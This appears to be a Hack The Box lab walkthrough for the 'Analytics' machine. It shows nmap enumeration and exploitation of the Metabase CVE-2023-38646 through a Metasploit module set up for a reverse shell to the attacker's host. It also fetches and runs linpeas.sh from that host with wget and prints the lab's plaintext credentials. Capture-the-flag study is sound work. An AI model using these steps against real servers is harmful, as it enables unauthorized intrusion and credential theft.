---
title: Hack The Box - Analytics
date: 2024-07-02 13:33:37 +0200
categories:
  - HackTheBox
tags:
  - HTB
comments: true
---

HTB Analytics Machine - https://www.hackthebox.com/machines/analytics

### Scanning & Enumeration
Scan the machine with Nmap tool
```
nmap -sC -sV 10.10.11.233
```

![](/assets/img/posts/Pasted image 20260820100731.png)

We will navigate to port 80, and while viewing the page source, a subdomain, **data.analytical.htb** , was found where a login page had been hosted

![](/assets/img/posts/Pasted image 20260820100904.png)

So add it to our `/etc/hosts` file
	`10.10.11.233 analytical.htb data.analytical.htb`

While navigating to the subdomain, a webpage hosting a login form of Metabase, searching in google for: `Metabase vulnerability POC`

![](/assets/img/posts/Pasted image 20260820101343.png)

### Exploitation & Gaining Access
It was discovered that it was vulnerable to CVE-2023-38646: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ and the Metasploit have a module for this vulnerability
```
msfconsole
search metabase
use exploit/linux/http/metabase_setup_token_rce
show option
set RHOST data.analytical.htb
set RPORT 80
set LHOST 10.10.16.27
run
```

After running the payload, we got a shell

![](/assets/img/posts/Pasted image 20260820101510.png)

### Privilege Escalation
Lets use `linpeas` script, to find interesting things: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS , so download it from our kali

First, from our kali
```
python3 -m http.server 80
```

Second, from the HTB machine
```
cd /home/metabase
wget <http://10.10.16.27/linpeas.sh>
chmod +x linpeas.sh
./linpeas.sh
```

After analyzing the results of `linpeas` script, a plain text of username and password were discovered
`META_PASS=An4lytics_ds20223#
`META_USER=metalytics`

![](/assets/img/posts/Pasted image 20250817003116.png)